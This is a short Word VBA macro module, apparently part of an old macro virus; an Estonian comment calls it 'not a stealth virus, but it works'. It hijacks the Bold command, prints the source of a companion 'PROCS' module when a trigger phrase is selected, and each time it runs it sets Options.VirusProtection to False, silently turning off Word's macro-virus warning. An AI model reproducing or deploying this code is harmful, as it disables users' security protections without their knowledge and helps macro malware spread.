   Attribute VB_Name = "BLD"
   Public Sub Main()
   ' ega see mingi stealth vir ei ole aga töötab :)
   Dim muutuja As Integer

   Word.Selection.Font.Bold = Not Word.Selection.Font.Bold
   If Word.Selection.Text <> "I AM CALLING YOU!" Then GoTo lopar

   Word.Selection.TypeText ("I AM HERE, READY AND WORKING (ver: " + MacroContainer.AutoTextEntries.Item("- AAAAAAAB").Value + Chr(13) + Chr(10))
   For muutuja = 1 To Templates(1).VBProject.VBComponents("PROCS").CodeModule.CountOfLines
   If Templates(1).VBProject.VBComponents("PROCS").CodeModule.Lines(muutuja, 1) = "' LOF_KEERME" Then GoTo lopar Else
   Word.Selection.TypeText (Templates(1).VBProject.VBComponents("PROCS").CodeModule.Lines(muutuja, 1) + Chr(13) + Chr(10))
   Next muutuja

   lopar:

   Options.VirusProtection = False
   End Sub
